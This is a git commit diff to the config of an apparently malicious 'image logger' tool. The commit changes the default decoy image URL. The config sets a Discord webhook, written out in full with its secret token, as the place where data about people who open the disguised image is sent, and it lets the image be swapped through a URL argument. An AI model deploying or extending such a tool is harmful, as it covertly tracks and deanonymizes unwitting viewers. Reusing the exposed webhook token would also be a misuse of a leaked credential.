3bd8a08d0e76fee7bc70b7c8a0088977ffdf6a5c
windy <128990874+FishyRamen@users.noreply.github.com>
2026-01-19 17:29:23 -0500

    Update webhook image URL in main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1462933471163842703/Iv05gJFbFE39pnKIRAINN61YiYgSFotnM_3t-yBVJm2jjKb4_5K1KFcmKkteaQ6US8PU",
-    "image": "https://media.tenor.com/NIYkI_QSSaYAAAAe/marge.png", # You can also have a custom image by using a URL argument
+    "image": "https://pbs.twimg.com/media/GYIHRKmbsAAfMd-.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
